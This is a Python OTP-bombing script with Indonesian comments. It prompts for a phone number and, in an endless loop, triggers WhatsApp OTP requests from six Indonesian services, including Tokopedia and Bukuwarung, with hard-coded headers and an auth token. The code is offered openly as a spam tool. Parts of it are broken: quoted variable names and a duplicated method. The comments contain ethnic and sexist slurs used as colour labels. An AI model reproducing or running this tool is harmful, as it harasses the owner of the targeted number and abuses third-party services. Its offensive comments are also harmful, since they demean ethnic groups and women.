
#uwis pake nano njir, mau recode kah?
#boleh aja asal code requestnya jangan salah

#Modul Njir

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
import subprocess
import uuid
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print
from rich.progress import track
from rich.text import Text as teks
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as panel
from rich.console import Group as gp
from bs4 import BeautifulSoup as bs
from rich.columns import Columns as columns
from rich.console import Console as console
from rich.markdown import Markdown as mark
from rich.progress import Progress

#untuk warna selat sunda, coba sendiri kalau mau pake warna, cape gw anj, g work asu
g  =   "\033[1;92m" #hijau blukutuk
d  =   "\033[1;97m" #warna china
s  =   "\033[1;90m" #warna negro
y  =   "\033[1;93m" #warna matahari
p  =   "\033[1;95m" #warna janda
r  =   "\033[1;91m" #warna ini
b  =   "\033[1;96m" #warna langit

def start():
    os.system("clear")
    print(f"Created By u0-a154")
    global nomor
    print(f"Example For Number : +628xxx")
    nomor = input(f"{r}Enter Number : +62").replace("+62","")
    if nomor == "":
            pass
    else:
            while True:
                    for _ in track(range(100), description=f"Spamming..."):()
                    sxp_wa()
class sxp_wa:

    def __init__(self):
            self.req = requests.Session()
            self.main()

    def wa_otp_1(self, no):
            nickname = random.choice(
                                      [
                                        "fahmi",
                                        "xzc0der",
                                        "bed3bah",
                                        "xmanz"
                                      ]
                                         )
            angka = random.randint(
                                    111,
                                    999
                                   )
            __req__ = self.req.post("https://wong.kitabisa.com/register/draft",
                    headers = {
                                "Host": "wong.kitabisa.com",
                                "x-ktbs-platform-name": "pwa",
                                "origin": "https://account.kitabisa.com",
                                "x-ktbs-time": "1611020248",
                                "user-agent": "agent",
                                "x-ktbs-api-version": "1.0.0",
                                "accept": "application/json",
                                "x-ktbs-client-name": "kanvas",
                                "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
                                "x-ktbs-client-version": "1.0.0",
                                "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
                                "version": "3.4.0",
                                "referer": "https://account.kitabisa.com/register/otp?type=sms",
                                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                               },
                    json = {
                             "full_name": "nickname+str(angka)",
                             "username": f"0{no}",
                             "otp_type": "whatsapp"
                            }
            ).text

    def wa_otp_2(self, no):
            __req__ = self.req.get(
                    f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
            ).text

    def wa_otp_3(self, no):
            __req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
                    headers = {
                                "Accept": "application/json",
                                "X-APP-VERSION-NAME": "3.4.0",
                                "X-APP-VERSION-CODE": "3399",
                                "Content-Type": "application/json; charset=UTF-8",
                                "Host": "api.bukuwarung.com",
                                "Connection": "Keep-Alive",
                                "Accept-Encoding": "gzip",
                                "User-Agent": "agent"
                               },
                   json = {
                            "action": "LOGIN_OTP",
                            "countryCode": "62",
                            "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
                            "method": "WA",
                            "phone": "no"
                           }
            ).text

    def wa_otp_4(self, no):
            __req__ = self.req.post("https://evermos.com/api/client/request-code",
                    headers = {
                                "user-agent": "agent"
                              },
                    data = {
                             "telephone": f"62{no}",
                             "type": "0"
                            }
).text

    def wa_otp_4(self, no):
            __req__ = self.req.post("https://evermos.com/api/client/request-code",
                    headers = {
                                "user-agent": "agent"
                              },
                    data = {
                             "telephone": f"62{no}",
                             "type": "0"
                            }
            ).text

    def wa_otp_5(self, no):
            __req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
                    headers = {
                                "Host": "wapi.ruparupa.com",
                                "Connection": "keep-alive",
                                "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
                                "Accept": "application/json",
                                "Content-Type": "application/json",
                                "X-Company-Name": "odi",
                                "user-agent": "agent",
                                "user-platform": "mobile",
                                "X-Frontend-Type": "mobile",
                                "Origin": "https://m.ruparupa.com",
                                "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
                                "Accept-Encoding": "gzip, deflate, br",
                                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                               },
                    json = {
                             "phone": f"0{no}",
                             "action": "register",
                             "channel": "chat",
                             "email": "",
                             "customer_id": "0",
                             "is_resend": "0"
                            }
            ).text

    def wa_otp_6(self, no):
            headers = {
                        "Connection": "keep-alive",
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Origin": "https://accounts.tokopedia.com",
                        "X-Requested-With": "XMLHttpRequest",
                        "user-agent": "agent",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Accept-Encoding": "gzip, deflate",
                       }
            site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26one%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
            search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
            data = {
                     "otp_type": "116",
                     "msisdn": "no",
                     "tk": "search",
                     "email": "",
                     "original_param": "",
                     "user_id": "",
                     "signature": "",
                     "number_otp_digit": "6",
                    }
            __req__ = self.req.post(
                            "https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
       ).text

    def main(self):
            self.wa_otp_1(nomor)
            self.wa_otp_2(nomor)
            self.wa_otp_3(nomor)
            self.wa_otp_4(nomor)
            self.wa_otp_5(nomor)
            self.wa_otp_6(nomor)
            print(f"Success : +62{nomor}")

start()
